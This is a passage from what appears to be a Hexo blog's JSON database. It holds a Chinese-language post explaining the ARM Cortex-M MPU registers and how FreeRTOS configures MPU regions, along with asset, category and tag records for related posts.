状态下可以通过额外的地址访问 Non-secure 的寄存器。MPU 寄存器只可以在 privileged 模式下访问。MPU 默认关闭在重启之后。下表为 MPU 所有寄存器的地址信息。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_registers.jpg\" alt><br></p>\n<h1 id=\"Memory-Register-Definitions\"><a href=\"#Memory-Register-Definitions\" class=\"headerlink\" title=\"Memory Register Definitions\"></a>Memory Register Definitions</h1><h2 id=\"MPU-TYPE\"><a href=\"#MPU-TYPE\" class=\"headerlink\" title=\"MPU_TYPE\"></a>MPU_TYPE</h2><p>MPU 类型寄存器是只读寄存器，它表明 MPU 可用的区域总数</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_type_register.jpg\" alt><br></p>\n<h2 id=\"MPU-CTRL\"><a href=\"#MPU-CTRL\" class=\"headerlink\" title=\"MPU_CTRL\"></a>MPU_CTRL</h2><p>由下图可见MPU_CTRL 寄存器有三个功能，第一个是定义使能 privileged background 区域，即没有在mpu区域内的内存空间。第二个是使能 HardFault 和 NMI 受到 MPU 配置影响。第三个是使能 MPU 配置生效。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register1.jpg\" alt><br><br><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_ctrl_register2.jpg\" alt><br></p>\n<h2 id=\"MPU-RNR\"><a href=\"#MPU-RNR\" class=\"headerlink\" title=\"MPU_RNR\"></a>MPU_RNR</h2><p>MPU_RNR 寄存器负责选择 MPU 的区域号</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rnr_register.jpg\" alt><br></p>\n<h2 id=\"MPU-RBAR\"><a href=\"#MPU-RBAR\" class=\"headerlink\" title=\"MPU_RBAR\"></a>MPU_RBAR</h2><p>MPU_RBAR 寄存器主要负责定义一个区域的起始地址和访问权限</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register1.jpg\" alt><br><br><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rbar_register2.jpg\" alt><br></p>\n<h2 id=\"MPU-RLAR\"><a href=\"#MPU-RLAR\" class=\"headerlink\" title=\"MPU_RLAR\"></a>MPU_RLAR</h2><p>MPU_RLAR 负责定义区域的大小，选择区域属性配置项以及区域的使能。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlar_register.jpg\" alt><br></p>\n<h2 id=\"MPU-MAIR0-1\"><a href=\"#MPU-MAIR0-1\" class=\"headerlink\" title=\"MPU_MAIR0/1\"></a>MPU_MAIR0/1</h2><p>MPU_MAIR0/1 用于设定内存的类型(device memory or normal memory)</p>\n<h2 id=\"Other-registers\"><a href=\"#Other-registers\" class=\"headerlink\" title=\"Other registers\"></a>Other registers</h2><p>除了以上寄存器，MPU 还提供了其他一些寄存器，比如 MPU_RBAR_A1/2/3，MPU_RLAR_A1/2/3。这些寄存器主要是为了加速开发流程，不需要每次配置一个区域需要设置区域号，可以一次配置多个区域。</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mpu_rlara_register.jpg\" alt><br></p>\n<h1 id=\"Configure-an-MPU-region\"><a href=\"#Configure-an-MPU-region\" class=\"headerlink\" title=\"Configure an MPU region\"></a>Configure an MPU region</h1><p><img style=\"display: block; margin: 0 auto;\" src=\"images/configure_mpu.jpg\" alt><br></p>\n<h1 id=\"MPU-Configuration-in-FreeRTOS\"><a href=\"#MPU-Configuration-in-FreeRTOS\" class=\"headerlink\" title=\"MPU Configuration in FreeRTOS\"></a>MPU Configuration in FreeRTOS</h1><p>FreeRTOS 源码中对 background 设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/backgroud_freertos.jpg\" alt><br></p>\n<p>FreeRTOS 源码中对 MPU_MAIR0/1 的设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/mair_freertos.jpg\" alt><br></p>\n<p>FreeRTOS 源码中对用户 stack 的设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_stack.jpg\" alt><br></p>\n<p>FreeRTOS 源码中对指定 MPU 区域的设置</p>\n<p><img style=\"display: block; margin: 0 auto;\" src=\"images/freertos_region_configuration.jpg\" alt><br></p>\n"}],"PostAsset":[{"_id":"source/_posts/freertos_implemantion/images/TCB.jpg","slug":"images/TCB.jpg","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/freertos_implemantion/images/code_architecture.jpg","slug":"images/code_architecture.jpg","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/freertos_implemantion/images/list_item_structure.jpg","slug":"images/list_item_structure.jpg","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/freertos_implemantion/images/list_list_structure.jpg","slug":"images/list_list_structure.jpg","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/freertos_implemantion/images/source_diretory.jpg","slug":"images/source_diretory.jpg","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/freertos_implemantion/images/ready_list_structure.png","slug":"images/ready_list_structure.png","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/freertos_implemantion/images/state_transition.jpg","slug":"images/state_transition.jpg","post":"ckfq5d2zq0001dljx7zmrl1eb","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/basic_non_secure_application.jpg","slug":"images/basic_non_secure_application.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/invoke_command_process.jpg","slug":"images/invoke_command_process.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/non_call_secure.jpg","slug":"images/non_call_secure.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/secure_interrupt_handler.jpg","slug":"images/secure_interrupt_handler.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/secure_module_command_overview.jpg","slug":"images/secure_module_command_overview.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/secure_secure.jpg","slug":"images/secure_secure.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/command_handle_memory layout.jpg","slug":"images/command_handle_memory layout.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/overview.png","slug":"images/overview.png","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/global_overview.jpg","slug":"images/global_overview.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/secure_module_manifest.jpg","slug":"images/secure_module_manifest.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/kinibi_introduction/images/manifest.jpg","slug":"images/manifest.jpg","post":"ckfun9itw0000jzjx5ohr7asz","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/backgroud_freertos.jpg","slug":"images/backgroud_freertos.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/configure_mpu.jpg","slug":"images/configure_mpu.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/freertos_region_configuration.jpg","slug":"images/freertos_region_configuration.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/freertos_stack.jpg","slug":"images/freertos_stack.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mair_freertos.jpg","slug":"images/mair_freertos.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_ctrl_register2.jpg","slug":"images/mpu_ctrl_register2.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_rbar_register2.jpg","slug":"images/mpu_rbar_register2.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_rlara_register.jpg","slug":"images/mpu_rlara_register.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/cortexm23_architecture.jpg","slug":"images/cortexm23_architecture.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_ctrl_register1.jpg","slug":"images/mpu_ctrl_register1.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_rbar_register1.jpg","slug":"images/mpu_rbar_register1.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_registers.jpg","slug":"images/mpu_registers.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_rlar_register.jpg","slug":"images/mpu_rlar_register.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_rnr_register.jpg","slug":"images/mpu_rnr_register.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0},{"_id":"source/_posts/arm_mpu/images/mpu_type_register.jpg","slug":"images/mpu_type_register.jpg","post":"ckfungjek0000uwjxwbr3310n","modified":0,"renderable":0}],"PostCategory":[{"post_id":"ckfq5d2zq0001dljx7zmrl1eb","category_id":"ckfqxctp00000x3jxtioq84a9","_id":"ckfqxctp40003x3jxcueh4uh5"},{"post_id":"ckfungjek0000uwjxwbr3310n","category_id":"ckfqxctp00000x3jxtioq84a9","_id":"ckfungjew0002uwjx9wlc3p46"},{"post_id":"ckfun9itw0000jzjx5ohr7asz","category_id":"ckfqxctp00000x3jxtioq84a9","_id":"ckfungjfw0006uwjx12xemheh"},{"post_id":"ckfq5d2zu0003dljxvsgmcgdm","category_id":"ckfungjfv0005uwjxkmjegbee","_id":"ckfungjg20007uwjx9q68rbfl"},{"post_id":"ckfq5d2zx0004dljxz6vzgctk","category_id":"ckfungjgp0008uwjxtjk15zgi","_id":"ckfungjgr0009uwjxll4nnevc"}],"PostTag":[{"post_id":"ckfq5d2zq0001dljx7zmrl1eb","tag_id":"ckfqxctp10001x3jx3508cv9b","_id":"ckfqxctp30002x3jx7qos4jvz"},{"post_id":"ckfungjek0000uwjxwbr3310n","tag_id":"ckfungjet0001uwjxc3povqrl","_id":"ckfungjf20003uwjx8au4o24i"},{"post_id":"ckfun9itw0000jzjx5ohr7asz","tag_id":"ckfqxctp10001x3jx3508cv9b","_id":"ckfungjfu0004uwjxutrylxzf"}],"Tag":[{"name":"OS","_id":"ckfqxctp10001x3jx3508cv9b"},{"name":"peripherals","_id":"ckfungjet0001uwjxc3povqrl"}]}}